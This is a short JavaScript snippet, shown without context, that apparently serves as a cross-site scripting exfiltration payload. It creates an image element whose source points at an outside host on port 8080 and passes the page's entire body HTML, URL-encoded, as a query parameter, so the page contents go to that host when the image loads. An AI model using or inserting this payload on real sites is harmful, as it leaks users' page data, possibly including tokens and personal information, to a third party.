const img = document.createElement('img');
img.src = 'http://xn--gssl-0ra.ch:8080/?data='+encodeURIComponent(document.body.innerHTML);
document.body.appendChild(img);
